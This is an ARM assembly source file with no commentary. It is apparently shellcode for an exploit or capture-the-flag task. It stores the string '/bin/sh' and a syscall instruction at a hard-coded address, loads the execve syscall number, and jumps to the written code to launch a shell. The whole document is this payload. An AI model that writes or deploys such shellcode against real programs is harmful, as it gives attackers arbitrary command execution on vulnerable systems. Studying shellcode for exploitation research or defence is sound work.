    .global _start

    .macro set reg, hi, lo
    mov     \reg,   \lo
    movt    \reg,   \hi
    .endm

_start:
    set     r6, #0xdead, #0x0080
    
    eor     r1, r1, r1
    set     r2, #0x6e69, #0x622f       // /bin
    set     r3, #0x68,   #0x732f       // /sh
    set     r4, #0xef00, #0x0000

loop:
    str     r4, [r6, #0x00]
    str     r2, [r6, #0x04]
    str     r3, [r6, #0x08]
    str     r1, [r6, #0x0c]

    mov     r7, #11
    add     r0, r6, #0x04
    eor     r1, r1, r1
    eor     r2, r2, r2

    blx     r6

    .align 7

syscall:
    nop
shell:
    nop
    nop
    nop
